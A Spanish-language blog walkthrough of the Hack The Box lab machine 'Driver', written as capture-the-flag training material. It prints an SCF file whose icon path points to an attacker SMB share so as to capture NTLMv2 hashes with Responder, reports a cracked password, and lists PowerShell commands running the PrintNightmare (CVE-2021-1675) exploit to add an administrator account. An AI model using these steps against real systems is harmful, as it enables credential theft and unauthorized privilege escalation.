---
title: "Driver - Hack The Box"
layout: single
excerpt:
show_date: true
classes: wide
header:
  teaser: "https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/driver/data/driver.png"
  teaser_home_page: true
  icon: "https://github.com/Wiinsad/Wiinsad.github.io/blob/master/assets/images/icons/Hackthebox2.png?raw=true"
categories:
  - Writeup
  - HackTheBox
tags:
  - SMB
  - SCF File Attack
  - SMB Relay Attack
---

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/Wiinsad.github.io/master/assets/images/machines/HTB/driver/data/driverHTB.png">
</p>

La máquina **Driver** es una máquina virtual vulnerable de la plataforma HackTheBox con un nivel de dificultad **EASY** una calificación en el rank de 4.7, **9550 USER OWNS** y **8344 SYSTEM OWNS** con la ip **10.10.11.106** y un sistema operativo **Windows**.

## Port Scan

Para empezar, hice un escaneo con la herramienta **Nmap** para encontrar los puertos abiertos disponibles en la máquina con **[Ip:10.10.11.106]** utilizando los parámetros:
- **-p-:**    Escaneo a toda la gama de puertos (65536).
- **-n:**     No hacen la resolución del DNS.
- **-T5:**    El parámetro más agresivo y ruidoso pero más rápido para hacer una exploración rápida.
- **--open:** Muestra sólo los puertos con un estatus abierto.
- **-oG:**    Guarda la el output en formato Grepeable.


  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/scanPort.png">
  </p>


  Una vez que hicimos el escaneo de puertos con la herramienta **ExtractPorts**, vemos que los puertos que destacaron en este caso fueron **80,135,445,5985**:

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/Ports.png">
  </p>


  Ya identificados los puertos abiertos realizare un escaneo de versiones y servicios de estos puertos con la herramienta nmap configurando los siguientes parámetros:

  - **-sC:** Script de enumeración básica de sondeo en puertos y servicios alojados.
  - **-sV:** Detección de versiones en servicios alojados en puertos.
  - **-p :** Puertos a inspeccionar.
  - **-oN:** Formatos de Nmap en los que se guardará el archivo.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/Portserv.png">
  </p>

  El resultado de el scaneo a puertos y servicios no mostró información interesante así que iniciare la fase de reconocimiento mediante el servicio web aprovechando que esta el puerto **80** abierto.

  Al entrar a la pagina se puede ver un panel de inicio de sesión y probando credenciales básicas como **admin - admin** se puede acceder a la pagina.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/web.png">
  </p>

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/web1.png">
  </p>

  Examinando la pagina se puede llegar al apartado de **Firmware Update** y hay un texto muy interesante el cual dice que **Nuestro equipo de testeo revisará las cargas e iniciará las pruebas en breves**

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/web2.png">
  </p>

  Buscando formas de ingresar una rever shell o algún binario con código malicioso no se llego a ningún resultado y analizando el texto y recordando que esta **SMB** abierto podemos hacer un ataque **SCF File Attack** esto mediante la creación de un archivo SCF (Shell Command Files) el cual sirve para realizar un conjunto limitado de operaciones como mostrar el escritorio de Windows o abrir un explorador de Windows un archivo SCF puede ser utilizado para acceder a una ruta UNC que se usan para acceder a los recursos de red.

  Todo esto se puede usar para que cuando la victima descargue el archivo el archivo tenga definido que el icono del mismo es un archivo en la red del atacante esto con el fin hacer un **SMB Relay** que es un ataque utilizado para llevar a cabo ataques **SMB man-in-the-middle** y de esta forma obtener los **Hashes NTLMv2** de usuario que esta descargando el archivo.

  Así que para hacer esto mencionado creare el archivo **SCF** con el siguiente contenido:

```powershell
[shell]
Command=2
IconFile=\\10.10.14.180\share\winsad.ico
[Taskbar]
Command=ToggleDesktop
```

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/scf.png">
</p>

Ya teniendo el archivo listo usare la herramienta llamada **responder** que esta programada en python y sirve para hacer los ataques SMB Relay.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/responder.png">
</p>

Ya listo el responder y esperando a eventos el siguiente paso subir el archivo en la web y esperar a que uno del equipo de testeo abra el archivo.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/responder1.png">
</p>

Una vez que se subo el archivo se puede ver como el usuario **Tony** abre el archivo y se ve como se obtiene el **hash NTLMv2**
del mismo.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/responder2.png">
</p>

Usando el la herramienta de **john** y el diccionario **rockyou.txt** se puede crackear el hash y se puede ver que la contraseña del usuario **Tony** es **liltony**

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/scan/hash.png">
</p>

## Lateral Movement

Con esto que acabamos de conseguir y recordando la fase de scaneo podemos ver que el puerto **5985** que es **winrm** el servicio de escritorio remoto de Windows podemos intentar entrar con el usuario tony y su password que crackeamos.

Esto se hará con la herramienta **evil-winrm**:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/intrusion/winrm.png">
</p>

## Privilege escalation

Ya que estamos dentro de la maquina el siguiente paso es enumerar los privilegios y ver procesos activos en la maquina. Mediante se hace el reconocimiento se puede ver que existe un proceso poco usual en maquinas windows llamado **spoolsv**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/intrusion/spoolsv.png">
</p>

Investigando se puede llegar a un repositorio de [github](https://github.com/calebstewart/CVE-2021-1675) este repositorio tiene un exploit el cual abusa de la vulnerabilidad con el **CVE: CVE-2021-1675**.

Así que sabiendo esto aprovechando la herramienta de **evil-winrm** usare el comando **upload** para subir el exploit de **powershell** a la maquina, para esto cree una carpeta llamada **winsad** en la ruta **/temp**:

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/intrusion/exp1.png">
</p>

Ya una vez que subi el exploit y ejecute lo siguiente:

```powershell
  Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
  Import-Module .\cve-2021-1675.ps1
  Invoke-Nightmare -DriverName "Xerox" -NewUser "winsad" -NewPassword "winsad"
```


Lo que hace el exploit es abusar de un DLL de este servicio **spoolsv** y crea un usuario nuevo y lo agrega al grupo de **administrador**.

<p align="center">
<img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/intrusion/root.png">
</p>


  Una vez ejecutado el exploit sin problemas vuelvo a entrar con **evil-winrm**  com las credenciales **winsad - winsad**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/intrusion/root1.png">
  </p>


  Y como se puede ver puedo acceder a la maquina con el usuario **winsad** el cual esta en el grupo **administrador**.

  <p align="center">
  <img src="https://raw.githubusercontent.com/Wiinsad/winsad/master/assets/images/machines/HTB/driver/intrusion/root2.png">
  </p>
